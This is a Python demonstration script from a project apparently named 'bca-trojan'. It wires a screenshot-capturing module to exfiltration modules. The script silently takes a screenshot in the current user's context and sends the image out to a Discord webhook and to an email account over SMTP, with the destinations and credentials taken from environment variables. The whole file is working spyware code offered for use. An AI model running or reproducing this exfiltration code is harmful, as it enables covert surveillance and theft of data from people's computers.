#!/usr/bin/env python3
# https://github.com/EONRaider/bca-trojan

__author__ = "EONRaider @ keybase.io/eonraider"

import os
import pathlib
import sys

sys.path.insert(0, str(pathlib.Path(__file__).parents[1]))

from src.modules.exfiltration import Discord, Email
from src.modules.exploitation import ScreenShot

import dotenv


'''This is a simple demonstration of how the ScreenShot module could be 
set up on a Linux system to take a screenshot within the context of the 
current user and exfiltrate the image as part of a message to a Discord 
server and as an attachment of an email message. 
The environment variable 'WEBHOOK_URL' must be passed if the Discord 
exfiltrator is to be used; similarly we need 'EMAIL_USERNAME' and 
'EMAIL_PASSWORD' for the Email exfiltrator.
'''

dotenv.load_dotenv()

# Set up the ScreenShot module to save the file to a pre-determined path
screenshot_file = pathlib.Path.home().joinpath("Desktop/sample_screenshot.png")
screenshot = ScreenShot(image_path=screenshot_file)

# The image will be sent to a Discord server through a Webhook URL
Discord(module=screenshot,
        webhook_url=os.getenv("WEBHOOK_URL"))

# An email will be sent through a secure connection using SMTP
Email(module=screenshot,
      smtp_host=os.getenv("EMAIL_HOST"),
      smtp_port=465,
      email=os.getenv("EMAIL_USERNAME"),
      password=os.getenv("EMAIL_PASSWORD"))

# Done. Take the screenshot and exfiltrate the image file.
screenshot.execute()
